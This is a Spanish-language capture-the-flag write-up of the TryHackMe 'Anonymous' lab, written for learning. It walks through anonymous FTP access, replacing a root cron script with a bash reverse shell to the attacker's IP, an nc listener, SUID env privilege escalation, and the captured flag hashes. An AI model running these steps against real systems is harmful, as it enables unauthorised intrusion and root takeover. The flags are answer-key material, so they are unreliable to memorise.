# Anonymous — TryHackMe

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-blue?style=flat)

> **Fecha:** 26/04/2026
> **Autor:** [Josue Rendón](https://github.com/Slasho01)
> **Room:** [Anonymous](https://tryhackme.com/room/anonymous)

---

## 📋 Descripción

Room de dificultad fácil que cubre enumeración de FTP anónimo, abuso de un cron job que ejecuta un script escribible para obtener reverse shell, y escalada de privilegios mediante el binario `env` con bit SUID.

---

## 🎯 Objetivos

* Flag de usuario
* Flag de root

---

## 🔍 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV -vv <TARGET_IP>
```

**Resultado:**

```
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
139/tcp open  netbios-ssn Samba 4.7.6-Ubuntu
445/tcp open  netbios-ssn Samba 4.7.6-Ubuntu
```

**Hallazgos clave:**

* FTP permite login anónimo con carpeta `scripts` escribible (`drwxrwxrwx`)
* SMB con `account_used: guest` y `message_signing: disabled`
* El hostname de la máquina es `ANONYMOUS` — pista directa del nombre de la room

---

## 🌐 2. Enumeración

### FTP — Acceso anónimo

```bash
ftp <TARGET_IP>
# Usuario: anonymous
# Password: (vacío)

ftp> cd scripts
ftp> ls
```

**Archivos encontrados:**

```
-rwxr-xrwx    clean.sh          ← escribible por todos
-rw-rw-r--    removed_files.log
-rw-r--r--    to_do.txt
```

**`clean.sh`** — script de limpieza ejecutado automáticamente:

```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]   # bug: siempre true (faltan espacios en la comparación)
then
    echo "Running cleanup script: nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
    done
fi
```

**`removed_files.log`** — entradas repetidas cada pocos minutos confirman que existe un cron job ejecutando el script.

**`to_do.txt`:**
```
I really need to disable the anonymous login...it's really not safe
```

### SMB — Enumeración de shares

```bash
smbclient -L <TARGET_IP> -N
```

**Shares encontrados:**

```
print$    Disk    Printer Drivers
pics      Disk    My SMB Share Directory for Pics
IPC$      IPC     IPC Service
```

```bash
smbclient //<TARGET_IP>/pics -N
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
# Descarga: corgo2.jpg, puppos.jpeg
```

Análisis con `strings` y `exiftool` — sin información relevante. El vector no es esteganografía.

---

## 💥 3. Explotación — Cron Job Hijacking

`clean.sh` tiene permisos de escritura para todos y es ejecutado automáticamente por root via cron. Se reemplaza con una reverse shell:

**Crear payload:**

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/<TU_IP>/4444 0>&1' > clean.sh
```

**Iniciar listener:**

```bash
nc -lvnp 4444
```

**Subir script malicioso por FTP:**

```bash
ftp <TARGET_IP>
ftp> cd scripts
ftp> put clean.sh
ftp> bye
```

Tras ~1 minuto el cron ejecuta el script y se recibe la conexión:

```
Connection received on <TARGET_IP> 60098
bash: cannot set terminal process group (1723): Inappropriate ioctl for device
namelessone@anonymous:~$
```

**Upgrade de shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🚩 4. Flag de usuario

```bash
cat ~/user.txt
```

```
90d6f992585815ff991e68748c414740
```

---

## ⬆️ 5. Escalada de privilegios — SUID env

### Enumeración

```bash
# sudo no disponible sin TTY
sudo -l
# sudo: no tty present and no askpass program specified

# Buscar binarios SUID
find / -perm -4000 -type f 2>/dev/null
```

**Binario explotable encontrado:**

```
/usr/bin/env
```

`env` con SUID permite ejecutar comandos con los privilegios del propietario (root).

### Explotación

```bash
/usr/bin/env /bin/sh -p
whoami
# root
```

---

## 🚩 6. Flag de root

```bash
cat /root/root.txt
```

```
4d930091c31a622a7ed10f27999af363
```

---

## 📝 7. Lecciones aprendidas

* El **FTP anónimo** con carpetas escribibles es una misconfiguration crítica — nunca debería existir en producción
* Un **cron job que ejecuta un script escribible** por usuarios no privilegiados equivale a ejecución de código como root
* El binario `env` con **SUID** permite escalada directa — revisar siempre `find / -perm -4000`
* Las entradas repetidas en logs son una señal de **automatización** — útil para detectar cron jobs explotables
* Siempre enumerar **todos los servicios** (FTP, SMB, SSH) antes de intentar explotar uno

---

## 🔗 Referencias

* [GTFOBins — env SUID](https://gtfobins.github.io/gtfobins/env/#suid)
* [HackTricks — Cron Jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-scripts-called-by-root)

---

*Write-up por [Josue Rendón](https://github.com/Slasho01) · [TryHackMe Profile](https://tryhackme.com/p/Slasho)*
